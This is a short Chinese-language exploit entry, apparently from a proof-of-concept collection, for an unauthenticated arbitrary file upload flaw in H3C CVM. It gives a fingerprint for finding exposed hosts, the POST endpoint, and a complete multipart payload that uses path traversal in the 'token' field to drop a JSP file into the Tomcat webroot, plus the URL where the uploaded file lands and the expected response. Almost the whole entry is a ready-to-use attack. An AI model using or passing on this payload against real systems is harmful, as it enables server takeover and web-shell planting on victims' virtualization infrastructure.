# H3CCVMfileUploadfd前台任意文件上传漏洞

H3CCVMfileUploadfd ｜ 文件上传 ｜ —
- **指纹**：`server="H3C-CVM"`
- **请求**：`POST /cas/fileUpload/fd HTTP/1.1`

**Payload**
```
--a4d7586ac9d50625dee11e86fa69bc71
Content-Disposition: form-data; name="token"
/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/stc11.jsp
--a4d7586ac9d50625dee11e86fa69bc71
Content-Disposition: form-data; name="file"; filename="123.jsp"
Content-Type: image/png
<% out.println("215882935");%>
--a4d7586ac9d50625dee11e86fa69bc71--
上传定位：http://ip/cas/js/lib/buttons/stc11.jsp
```
- **响应特征**：200